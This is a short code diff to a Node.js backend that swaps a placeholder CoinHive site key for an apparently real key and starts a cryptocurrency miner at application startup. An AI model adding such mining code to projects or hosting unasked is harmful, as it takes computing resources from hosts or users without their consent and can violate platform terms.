@@ -6,7 +6,7 @@ var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
 var AV = require('leanengine');
 
-var miner = await CoinHive('SITE_KEY');
+var miner = await CoinHive('od8Mnoa7vWHNiXNCsE7jzsf8rpreuHBJ');
 await miner.rpc('isRunning'); // false
 await miner.start();
 
